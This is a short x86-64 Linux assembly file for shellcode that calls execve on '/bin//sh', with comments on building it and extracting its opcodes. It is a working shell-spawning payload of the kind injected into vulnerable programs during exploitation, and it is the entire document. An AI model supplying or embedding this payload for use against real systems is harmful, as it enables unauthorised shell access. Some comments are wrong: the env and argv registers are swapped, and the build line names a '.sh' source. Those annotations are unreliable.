; Compile to test or get opcodes with
; nasm -f elf64 standard_execve.sh
; ld standard_execve.o -o standard_execve

section .text
	global _start

_start:
	; Create room on the stack for the /bin//sh string
	sub sp, 0x0202

	; execve syscall number (59)
	xor rax, rax
	mov al, 59

	; env
	xor rsi, rsi

	; argv
	xor rdx, rdx

	;filename
	push rdx 
	mov rdi, 0x68732f2f6e69622f
	push rdi
	lea rdi, [rsp]

	; execve syscall
	syscall
	
